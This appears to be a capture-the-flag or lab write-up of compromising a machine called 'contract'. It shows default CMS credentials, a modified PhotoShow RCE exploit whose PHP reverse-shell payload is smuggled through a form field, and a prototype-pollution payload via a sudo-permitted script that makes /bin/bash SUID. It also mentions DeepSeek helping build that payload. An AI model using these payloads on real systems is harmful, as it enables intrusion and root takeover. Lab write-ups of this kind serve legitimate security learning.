### Exploitation

The target has only an HTTP service running besides the SSH, on it there is a PhotoShow CMS, I've tried with some default credentials and the pair that worked was `admin:password`:
![](/assets/img/Pasted-image-20250220180624.png)

This CMS is vulnerable to [PhotoShow - Remote Code Execution](https://www.exploit-db.com/exploits/51236), I downloaded the script and after some attempts I got a successful shell by modifying the payload on the script from `bash -c 'bash -i..` for this one:
```bash
 def createInjection(attackerIp, attackerNcPort):
    textToEncode = "php -r '$sock=fsockopen(\"" + attackerIp + "\"," + attackerNcPort + ");exec(\"sh <&3 >&3 2>&3\");'"
    b64Encoded = base64.b64encode(textToEncode.encode("ascii"))
    strb64 = str(b64Encoded)[2:-1]
    injection = {"exiftran_path": "echo " + strb64 + " | base64 -d > /tmp/1.sh ;/bin/bash /tmp/1.sh"}
    return urllib.parse.urlencode(injection)
```

For some reason only php revshell payload works, after that we got a shell.

### Privilege Escalation

I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
www-data@contract:~/html$ sudo -l
Matching Defaults entries for www-data on contract:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on contract:
    (ALL : ALL) NOPASSWD: /usr/bin/agreement
```
This is the content of it:
```bash
wwww-data@contract:~/html$ cat /usr/bin/agreement
#! /usr/bin/env node
var args = process.argv.slice(2);
(async () => {
  const lib = await import('@agreejs/shared');
  const { exec } = await import('child_process');
  var components=JSON.parse(args[0])
  try {
    lib.mergeInternalComponents (components)
  } catch (e) { }
  var user = {}
  if(user.authenticated===true)
  {
    exec(user.cmd);
  }
})();
```
As usual, the vulnerability relays on the imported library, in this case `@agreejs/shared`, there is a vulnerability reported as [Remote code execution in @agreejs/shared](https://security.snyk.io/vuln/SNYK-JS-AGREEJSSHARED-7417398), after reading the article and with the aid of DeepSeek I came with the following payload:
```bash
www-data@contract:~/html$ sudo /usr/bin/agreement '{"__proto__":{"authenticated":true,"cmd":"chmod +s /bin/bash"}}'
www-data@contract:~/html$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
And we ARE INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`/proc/1/environ`
`/root`

### Credentials

- Credentials identified for PhotoShow are `admin:password`

### Notes

- Sometimes the public exploits only work on certain environments, in this case we needed to modify ours so we can successfully exploit the vulnerability in the CMS, so it is a good idea to always have more than one revshell payload to avoid this scenarios.
